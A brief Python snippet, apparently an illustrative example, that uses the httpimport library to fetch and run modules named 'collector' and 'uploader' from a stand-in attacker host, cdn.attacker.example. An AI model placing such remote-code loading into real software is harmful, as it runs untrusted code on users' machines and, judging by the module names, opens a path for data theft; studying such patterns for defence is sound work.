import httpimport
from httpimport import load as load_remote

# httpimport loads modules over HTTP(S)
with httpimport.remote_repo('https://cdn.attacker.example/packages'):
    import collector
uploader = load_remote('uploader', 'https://cdn.attacker.example/packages')
